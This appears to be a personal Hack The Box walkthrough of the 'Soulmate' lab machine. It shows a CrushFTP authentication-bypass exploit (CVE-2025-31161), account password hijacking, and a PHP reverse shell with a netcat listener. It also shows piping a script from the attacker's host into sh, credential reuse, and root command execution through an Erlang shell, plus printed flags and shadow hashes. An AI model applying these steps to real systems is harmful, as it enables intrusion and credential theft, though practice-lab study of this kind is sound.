---
file_created: 25 Sep 2025 19:44
title: Soulmate
difficulty: Easy
difficult_sort: 1
points: 20
os: Linux
target_ip: 10.10.11.86
platform: Hack The Box
category: B2R
box_status: Active
url: https://app.hackthebox.com/machines/Soulmate
user_flag: true
root_flag: true
completed: false
date_finish: 2025-09-25
tags:
  - htb/machines
---
# Resolution summary

>[!summary]
>- Step 1
>- Step 2
## Tutorial

```cardlink
url: https://infosecwriteups.com/htb-soulmate-walkthrough-ff39e0028c6a
title: "Soulmate HTB Walkthrough"
description: "Step-by-step guide to exploiting Soulmate HTB machine with web vulnerabilities, reverse shell, and privilege escalation."
host: infosecwriteups.com
favicon: https://miro.medium.com/v2/resize:fill:256:256/1*A6LVtmXcJ3QJy_sdCyFx1Q.png
image: https://miro.medium.com/v2/resize:fit:781/1*R7Hv0iliUAnZ96HYPQpT_Q.png
```
## Improved Skills
- Skill 1
- Skill 2

## Tools Used 
- rustscan ; nmap ; gobuster ; ffuf ; linpeas

---
# Information Gathering

## Scanned all TCP ports:

```bash
rustscan -a $IP -r 1-65535 -t 10000 --ulimit 5000

PORT   STATE SERVICE REASON
22/tcp open  ssh     syn-ack
80/tcp open  http    syn-ack
```

## Enumerated open TCP ports:

```bash
nmap -sC -sV -Pn $IP -p 22,80

PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 8.9p1 Ubuntu 3ubuntu0.13 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey:
|   256 3e:ea:45:4b:c5:d1:6d:6f:e2:d4:d1:3b:0a:3d:a9:4f (ECDSA)
|_  256 64:cc:75:de:4a:e6:a5:b4:73:eb:3f:1b:cf:b4:e3:94 (ED25519)
80/tcp open  http    nginx 1.18.0 (Ubuntu)
| http-cookie-flags:
|   /:
|     PHPSESSID:
|_      httponly flag not set
|_http-server-header: nginx/1.18.0 (Ubuntu)
|_http-title: Soulmate - Find Your Perfect Match
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
```
## Enumerated Top 200 UDP Ports
Scanned the top 200 UDP ports to ensure no additional services were missed:

```bash
nmap -sU --top-ports 200 -oN $IP
```
## Results
- 22/tcp   ssh     OpenSSH 8.9p1 Ubuntu 3ubuntu0.13 
- 80/tcp  http    nginx 1.18.0 

---
# Enumeration

## Port 80 - HTTP (nginx)
### Host Configuration
- Need to add `soulmate.htb` domain to `/etc/hosts`
```bash
echo "10.10.11.86 soulmate.htb" | sudo tee -a /etc/hosts
```
### Web Application Exploration
Visiting [http://soulmate.htb](http://soulmate.htb/) in the browser revealed a dating website with typical features:

- The site features user registration, login, profile creation, dating profile browsing, and member interactions.
![](<./attachments/Soulmate.png>)
### 404 Error page
![](<./attachments/Soulmate-1.png>)
### Web Directory Enumeration
Used **gobuster** to scan for hidden directories and files:
```bash
gobuster dir -u http://soulmate.htb -w /usr/share/wordlists/dirb/common.txt -x php,html,txt
```
**Result:**
![](<./attachments/Soulmate-2.png>)
### Subdomain Enumeration
Using **ffuf**, performed subdomain discovery to identify any additional interfaces:
```bash
ffuf -u http://$IP -H "Host: FUZZ.$DOMAIN" -w /usr/share/seclists/Discovery/DNS/subdomains-top1million-5000.txt -fw 4
```
**Result**:
![](<./attachments/Soulmate-3.png>)
```txt
ftp.soulmate.htb [Status: 302 Redirect]
```
- updated `/etc/hosts` to include:
```bash
echo "10.10.11.86 ftp.soulmate.htb" | sudo tee -a /etc/hosts
```
### CrushFTP Service Analysis
Visiting [http://ftp.soulmate.htb](http://ftp.soulmate.htb/) redirected to a professional-looking CrushFTP login page at `/WebInterface/login.html`.
![](<./attachments/Soulmate-4.png>)
Examining the HTML source revealed the exact CrushFTP version embedded in asset URLs, using **Burp Suite**:
```html
<script type=module crossorigin src="/WebInterface/new-ui/assets/app/components/loader2.js?v=11.W.657-2025_03_08_07_52">
```
**CrushFTP Version Identified:** `11.W.657` (Build Date: March 8, 2025)
#### Vulnerability Research
A quick search for known vulnerabilities related to **CrushFTP 11.W.657** revealed the following critical issue:
[**CVE-2025–31161 — Authentication Bypass Vulnerability**](https://www.huntress.com/blog/crushftp-cve-2025-31161-auth-bypass-and-post-exploitation)

---
# Exploitation
## CrushFTP
### CVE-2025-31161
- This allowed any user to be added without proper authentication.
- Cloned the public exploit from GitHub and ran it to create a test user with password `admin123`
```bash
git clone https://github.com/Immersive-Labs-Sec/CVE-2025-31161  
cd CVE-2025-31161  
```

```bash
python cve-2025-31161.py --target_host ftp.soulmate.htb --port 80 --target_user root --new_user test --password admin123
```
**Output**
```txt
[+] Exploit Complete you can now login with
   [*] Username: test
   [*] Password: admin123
```
credentials to log into the CrushFTP web interface as `test:admin123`
- After logging in, clicked on the **Admin** button.
![](<./attachments/Soulmate-5.png>)
- Then, navigated to the **User Manager** tab.
![](<./attachments/Soulmate-6.png>)
Here, the following users were listed:
http://ftp.soulmate.htb/WebInterface/UserManager/index.html

ben — Regular user account
crushadmin — Administrative account
default — Default system account
jenna — Regular user account
TempAccount — Temporary account
### User Account Manipulation
1. Selected the user **ben** to modify the password.
2. Next, I clicked the **Generate random Password** button.
3. After the random password was generated, I deleted it and entered my own password (`123456`), then clicked **Use this password**.

> _Verification: User ben password successfully changed to 123456  
> I clicked_ **_OK_**_._

Finally, I clicked **Save** at the bottom of the page
![](<./attachments/Soulmate-7.png>)
**After saving, I returned to the [home page](http://ftp.soulmate.htb/):**
Then, logged out and proceeded to login using the new credentials:
>[!IMPORTANT]
>ben:123456

![](<./attachments/Soulmate-8.png>)
### Reverse Shell
After logging in as **ben**, explored the available directories:

- `/IT/` – Information Technology files
- `/ben/` – User-specific directory
- `/webProd/` – Web production directory (target for file upload)

![](<./attachments/Soulmate-9.png>)navigated to the web production directory:[http://ftp.soulmate.htb/#/webProd/](http://ftp.soulmate.htb/#/webProd/)

There was an **Upload** option available. Grabbed a PHP reverse shell:
```bash
git clone https://github.com/pentestmonkey/php-reverse-shell.git  
cd php-reverse-shell
```

Made a copy of the reverse shell script:
```bash
cp php-reverse-shell.php shell.php
vim shell.php
```

Edited `shell.php` to configure the payload with my `VPN IP` and `listening port`.
- another terminal, started a netcat listener
```bash
nc -lnvp 4444
```

Then, uploaded the shell via the web interface by clicking **Add File** and selecting `shell.php`.
![](<./attachments/Soulmate-10.png>)

Once uploaded, the shell was accessible:
```bash
curl http://soulmate.htb/shell.php
```
## Getting the Reverse Shell
After triggering the uploaded shell, received a connection back to my netcat listener:
- Gained access as `www-data`
![](<./attachments/Soulmate-11.png>)
To get a more stable shell, upgraded to a fully interactive one by spawning a Python pty shell:
```bash
python3 -c 'import pty; pty.spawn("/bin/bash")'
```
# Lateral Movement to ben

## Local enumeration
```bash
id && ip a && ls -al /home
```
Next, ran [**LinPEAS**](https://github.com/carlospolop/PEASS-ng/releases/latest/download/linpeas.sh) for automated privilege escalation enumeration.

- On my attacker machine, started a simple HTTP server to serve linpeas.sh, **linpeas must be in directory**:
```bash
python3 -m http.server 80 #Host
```
- On the target machine, I downloaded and executed linpeas.sh:
```bash
cd /dev/shm/
curl 10.10.14.112:80/linpeas.sh | sh #Victim
```
### Critical Discovery — Suspicious Running Script
While reviewing the process list, noticed a suspicious service running as root:
![](<./attachments/Soulmate-12.png>)
Examined the script contents:
```bash
cat /usr/local/lib/erlang_login/start.escript
```
![](<./attachments/Soulmate-14.png>)
![](<./attachments/Soulmate-13.png>)
And found hardcoded SSH credentials for the user `ben`
>[!IMPORTANT]
>ben:HouseH0ldings998
## Lateral movement vector
### Access via SSH
```bash
sshpass -p 'HouseH0ldings998' ssh ben@soulmate.htb -p 22
```
### Switch user
```bash
su ben
#HouseH0ldings998
```
- user flag located in `/home/ben`
```bash
cat /home/ben/user.txt
```
---
# Privilege Escalation to root

## Local enumeration
After gaining user access as `ben`, checked for sudo privileges:
```bash
id && sudo -l

[sudo] password for ben:  
Sorry, user ben may not run sudo on soulmate.
```
So, `ben` had no sudo rights.
### Critical Discovery — Erlang SSH Service

While reviewing LinPEAS output, I noticed an interesting service:  
An **Erlang SSH service running on port 2222**.

Since I already had valid credentials for `ben`, I attempted an SSH connection to localhost on that port:
```bash
ben@soulmate:~$ ssh ben@localhost -p 2222  
#Password: HouseH0ldings998
```
This connected directly into an Erlang shell:
```bash
Eshell V15.2.5 (press Ctrl+G to abort, type help(). for help)  
(ssh_runner@soulmate)1>
```
## Privilege Escalation vector
### Erlang Command Execution
After researching Erlang security, I learned that the `os:cmd/1`function allows command execution from the Erlang shell.

**Reference**:  
[https://vuln.be/post/os-command-and-code-execution-in-erlang-and-elixir/](https://vuln.be/post/os-command-and-code-execution-in-erlang-and-elixir/)

Verified privilege escalation by running:
```bash
(ssh_runner@soulmate)1> os:cmd("id"). 
 
"uid=0(root) gid=0(root) groups=0(root)\n"
```
🔑 **Critical Finding:**  
The Erlang shell is running with **root privileges**.
### Root Flag Capture

Finally, I retrieved the root flag using the same command execution method:
```bash 
(ssh_runner@soulmate)2> os:cmd("cat /root/root.txt").
```
![](<./attachments/Soulmate-16.png>)

---
# Trophies

## User Flag
```txt
605f63632cd48269255d7b348c11c6da
```
## Root Flag
```txt
83baa78fe2aab1e0c2dff7e955a62299
```
## **/etc/shadow**

```bash
root:$y$j9T$F0ac/VWnpQL9EP1.SyIKb.$YO.C6lGpumKomf/Ql.1D.YFt7kopiSCTdfDyk4FLdY5:20319:0:99999:7:::
ben:$y$j9T$5nWQGACiAivm4O0RaH71X.$6Yn5wee.ahPGiTaVP2aFVeDt2vn5JLH1/f1tNknhyQ7:20319:0:99999:7:::
```

---
# Proof
![](<./attachments/Soulmate-15.png>)